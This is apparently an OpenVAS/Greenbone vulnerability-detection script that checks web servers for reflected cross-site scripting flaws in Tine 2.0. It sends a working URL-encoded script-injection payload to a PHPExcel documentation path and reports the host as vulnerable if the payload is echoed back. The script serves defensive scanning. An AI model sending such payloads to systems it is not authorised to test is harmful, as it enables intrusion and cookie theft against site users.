if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103313" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2011-10-25 14:02:26 +0200 (Tue, 25 Oct 2011)" );
	script_bugtraq_id( 50307 );
	script_name( "Tine Multiple Cross Site Scripting Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/50307" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/520167" );
	script_xref( name: "URL", value: "https://www.htbridge.ch/advisory/multiple_vulnerabilities_in_tine_2_0.html" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:N/A:N" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Vendor updates are available. Please see the references for more
  information." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "Tine is prone to multiple cross-site scripting vulnerabilities because
  the application fails to sufficiently sanitize user-supplied data." );
	script_tag( name: "impact", value: "An attacker could exploit these vulnerabilities to execute arbitrary
  script code in the context of the affected website. This may allow the attacker to steal cookie-based
  authentication credentials and launch other attacks." );
	script_tag( name: "affected", value: "Tine 2.0 is vulnerable. Other versions may also be affected." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
vt_strings = get_vt_strings();
for dir in nasl_make_list_unique( "/tine", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	buf = http_get_cache( item: dir + "/index.php", port: port );
	if(!buf || !IsMatchRegexp( buf, "^HTTP/1\\.[01] 200" ) || ( !ContainsString( buf, "<!-- Tine -->" ) && !ContainsString( buf, "Tinebase" ) && !ContainsString( buf, "<!-- Tine 2.0 static files -->" ) )){
		continue;
	}
	url = dir + "/library/PHPExcel/PHPExcel/Shared/JAMA/docs/download.php/%27%3E%3Cscript%3Ealert(/" + vt_strings["lowercase"] + "/);%3C/script%3E";
	if(http_vuln_check( port: port, url: url, pattern: "<script>alert\\(/" + vt_strings["lowercase"] + "/\\);</script>", check_header: TRUE )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

